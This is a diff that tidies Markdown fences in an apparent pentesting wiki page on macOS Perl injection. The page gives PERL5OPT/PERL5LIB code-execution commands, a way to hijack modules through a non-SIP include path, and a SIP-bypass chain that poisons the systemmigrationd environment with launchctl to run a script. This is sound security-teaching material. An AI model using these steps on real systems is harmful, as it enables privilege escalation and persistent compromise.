@@ -1,6 +1,5 @@
 # macOS Perl Applications Injection
 
-
 ## Via `PERL5OPT` & `PERL5LIB` env variable
 
 Using the env variable **`PERL5OPT`** it's possible to make **Perl** execute arbitrary commands when the interpreter starts (even **before** the first line of the target script is parsed).  
@@ -10,14 +9,14 @@ For example, create this script:
 #!/usr/bin/perl
 print "Hello from the Perl script!\n";
 ```
-```
+
 Now **export the env variable** and execute the **perl** script:
 
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-```
+
 Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):
 
 ```perl:/tmp/pmod.pm
@@ -26,13 +25,13 @@ package pmod;
 system('whoami');
 1; # Modules must return a true value
 ```
-```
+
 And then use the env variables so the module is located and loaded automatically:
 
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
 ```
-```
+
 ### Other interesting environment variables
 
 * **`PERL5DB`** – when the interpreter is started with the **`-d`** (debugger) flag, the content of `PERL5DB` is executed as Perl code *inside* the debugger context.  
@@ -54,7 +53,7 @@ It is possible to list the include path that Perl will search (**`@INC`**) runni
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
-```
+
 Typical output on macOS 13/14 looks like:
 
 ```bash
@@ -68,7 +67,7 @@ Typical output on macOS 13/14 looks like:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-```
+
 Some of the returned folders don’t even exist, however **`/Library/Perl/5.30`** does exist, is *not* protected by SIP and is *before* the SIP-protected folders. Therefore, if you can write as *root* you may drop a malicious module (e.g. `File/Basename.pm`) that will be *preferentially* loaded by any privileged script importing that module.
 
 > [!WARNING]
@@ -86,7 +85,7 @@ Among the children identified by the researchers is the Apple-signed interpreter
 ```
 /usr/bin/perl /usr/libexec/migrateLocalKDC …
 ```
-```
+
 Because Perl honors `PERL5OPT` (and Bash honors `BASH_ENV`), poisoning the daemon’s *environment* is enough to gain arbitrary execution in a SIP-less context:
 
 ```bash
@@ -96,7 +95,7 @@ launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'
 # Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
 open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
 ```
-```
+
 When `migrateLocalKDC` runs, `/usr/bin/perl` starts with the malicious `PERL5OPT` and executes `/private/tmp/migraine.sh` *before SIP is re-enabled*. From that script you can, for instance, copy a payload inside **`/System/Library/LaunchDaemons`** or assign the `com.apple.rootless` extended attribute to make a file **undeletable**.
 
 Apple fixed the issue in macOS **Ventura 13.4**, **Monterey 12.6.6** and **Big Sur 11.7.7**, but older or un-patched systems remain exploitable.
